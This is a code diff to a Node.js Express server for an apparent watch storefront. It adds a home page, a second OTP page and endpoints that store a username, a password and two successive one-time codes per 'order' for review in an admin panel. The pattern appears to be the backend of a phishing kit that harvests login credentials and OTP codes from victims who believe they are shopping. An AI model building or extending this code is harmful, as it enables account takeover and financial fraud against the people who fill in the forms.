@@ -43,6 +43,11 @@ function getLang(req) {
 
 app.get('/', (req, res) => {
     const lang = getLang(req);
+    res.render('home', { lang, t: translations[lang] });
+});
+
+app.get('/watches', (req, res) => {
+    const lang = getLang(req);
     res.render('index', { lang, t: translations[lang], watches });
 });
 
@@ -96,6 +101,11 @@ app.get('/otp', (req, res) => {
     res.render('otp', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
 });
 
+app.get('/otp2', (req, res) => {
+    const lang = getLang(req);
+    res.render('otp2', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
+});
+
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'admin.html'));
 });
@@ -107,6 +117,22 @@ app.post('/api/admin-login', (req, res) => {
         return res.json({ ok: true });
     }
     res.json({ ok: false });
+});
+
+app.post('/api/submit-service', (req, res) => {
+    const service = req.body.service || '';
+    const request = {
+        id: nextId++,
+        name: '', phone: '', email: '', delivery: '', branch: '',
+        governorate: '', city: '', address: '', watchColor: '',
+        username: '', password: '', otp: '',
+        service: service,
+        step: 'service',
+        status: 'pending',
+        createdAt: new Date().toISOString()
+    };
+    requests.push(request);
+    res.json({ ok: true, id: request.id });
 });
 
 app.post('/api/submit-order', (req, res) => {
@@ -150,6 +176,17 @@ app.post('/api/submit-otp', (req, res) => {
     if (request) {
         request.otp = otp || '';
         request.step = 'otp';
+        request.status = 'pending';
+    }
+    res.json({ ok: true });
+});
+
+app.post('/api/submit-otp2', (req, res) => {
+    const { orderId, otp2 } = req.body;
+    const request = requests.find(r => r.id === orderId);
+    if (request) {
+        request.otp2 = otp2 || '';
+        request.step = 'otp2';
         request.status = 'pending';
     }
     res.json({ ok: true });
